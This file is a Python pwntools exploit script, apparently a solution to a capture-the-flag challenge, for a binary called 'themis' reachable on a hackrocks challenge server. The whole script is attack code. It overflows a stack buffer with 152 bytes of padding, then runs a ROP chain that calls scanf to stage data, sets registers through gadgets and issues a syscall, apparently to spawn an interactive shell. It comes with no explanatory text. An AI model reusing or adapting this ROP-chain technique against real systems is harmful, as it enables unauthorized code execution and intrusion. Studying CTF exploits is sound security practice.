#!/usr/bin/python3

from pwn import *

exe = ELF('themis', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x00000000004012b7

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challenges.hackrocks.com', 27383)
else:
        p = process(exe.path)

GDB()
pop_rbp = 0x000000000040117d
xor_rax_pop_rbp = 0x0000000000401202
payload = b"a" * 152
pop_rdi = 0x0000000000401353
pop_rsi_rdx = 0x0000000000401210
syscall = 0x0000000000401259

payload += flat(
        pop_rdi, 0x403029,
        pop_rsi_rdx, 0x0000000000404a00, 0x100,
        exe.plt['__isoc99_scanf'],
        
        xor_rax_pop_rbp, 0x0000000000404800,
        0x000000000040121b,0x0000000000404800,
        0x000000000040121b, 0x0000000000404800,
        0x000000000040121b,0x0000000000404800,
        0x000000000040122b, 0x0000000000404800,
        0x0000000000401239,0x0000000000404800, 
        0x0000000000401239, 0x0000000000404800,
        0x00000000004011f0, 0x0000000000404800,
        0x0000000000401353, 0x0000000000404a00,
        0x0000000000401210, 0, 0, 
        0x0000000000401259, 0x0000000000404800
)

sla(b"you.\n", payload)

p.interactive()
